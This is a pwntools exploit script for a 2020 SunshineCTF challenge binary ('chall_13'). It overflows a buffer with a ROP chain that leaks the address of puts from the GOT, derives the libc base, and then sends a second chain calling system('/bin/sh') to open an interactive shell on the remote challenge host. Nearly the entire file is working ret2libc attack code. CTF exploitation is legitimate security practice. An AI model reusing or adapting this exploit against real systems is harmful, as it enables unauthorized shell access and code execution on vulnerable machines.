#!/usr/bin/python3
from pwn import *
import monkeyhex
import re
import struct

context.log_level = 'debug'
context.terminal = ['termite', '-e']

lib = ELF('/usr/lib/libc.so.6') if not args.REMOTE else ELF('libc6_2.23-0ubuntu11.2_i386.so')
binary = context.binary = ELF('chall_13')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res



def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    p = process(binary.path)
    if start_gdb is True:
        attach_gdb(p)
    return p

rexp = re.compile(b'0x[a-f0-9]+')
p = new_proc(True) if not args.REMOTE else remote('chal.2020.sunshinectf.org', int('30013'))
r = ROP(binary)
r.call('plt.puts', (binary.sym['got.puts'], ))
r.call('vuln')

p.recvuntil(b'Keep on writing\n')
p.send(b'A'*0x13)
# p.sendline(cyclic(100))
p.sendline(b'A'*0x3d + r.chain())
leak = p.recvuntil(b'\n')

puts_addr = struct.unpack('<III', leak.strip())[0]
lib.address = puts_addr - lib.sym['puts']
r2 = ROP(binary)
r2.call(lib.symbols['system'], (next(lib.search(b'/bin/sh')),))
p.sendline(cyclic(0x3e) + p32(r2.find_gadget(['ret']).address) + r2.chain())
# p.sendline(b'A'*0x3d + r2.chain())

# do leak / payload gen here

# if args.DEBUG is True:
#     attach_gdb(p)
# p.sendline(payload)
# if args.DEBUG is True:
#     import ipdb as pdb; pdb.set_trace()

p.interactive()
